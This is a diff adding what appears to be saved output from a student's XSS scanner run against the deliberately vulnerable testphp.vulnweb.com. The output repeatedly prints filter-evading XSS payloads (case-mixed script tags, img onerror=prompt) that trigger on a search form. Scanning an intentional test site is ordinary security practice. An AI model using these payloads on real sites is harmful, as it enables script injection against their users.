@@ -1,0 +1,3965 @@
+vuln_scan.py"
+
+
+1. My UCF
+2. Vulnweb
+3. DVWA
+4. Custom URL
+Enter your choice--> 2
+http://testphp.vulnweb.com/style.css
+http://testphp.vulnweb.com/index.php
+http://testphp.vulnweb.com/categories.php
+http://testphp.vulnweb.com/artists.php
+http://testphp.vulnweb.com/disclaimer.php
+http://testphp.vulnweb.com/cart.php
+http://testphp.vulnweb.com/guestbook.php
+http://testphp.vulnweb.com/AJAX/index.php
+http://testphp.vulnweb.com/AJAX/styles.css
+http://testphp.vulnweb.com/login.php
+http://testphp.vulnweb.com/signup.php
+http://testphp.vulnweb.com/userinfo.php
+http://testphp.vulnweb.com/privacy.php
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/
+http://testphp.vulnweb.com/hpp/
+http://testphp.vulnweb.com/hpp/?pp=12
+http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/index.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/index.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/categories.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/categories.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/artists.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/artists.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/disclaimer.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/disclaimer.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/cart.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/cart.php in the following form *****
+
+ Script used --> < img src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> <script type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> <sCript>type='text/javascript'>javascript:alert(1);</scrIpt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+type='text/javascript'>javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> <sCript        type="text/javascript">javascript:alert(1);</scriPt>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> <script/type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> <script
+type="text/javascript">javascript:alert(1);</script>
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> < image / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> < img / src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> < image src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> < img src / onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
+***** XSS vulnerability discovered in http://testphp.vulnweb.com/guestbook.php in the following form *****
+
+ Script used --> < image src = q onerror = prompt(8) >
+<form action="search.php?test=query" method="post">
+<label>search art</label>
+<input name="searchFor" size="10" type="text"/>
+<input name="goButton" type="submit" value="go"/>
+</form>
+
+
+
+--> Testing form in http://testphp.vulnweb.com/guestbook.php
+
+
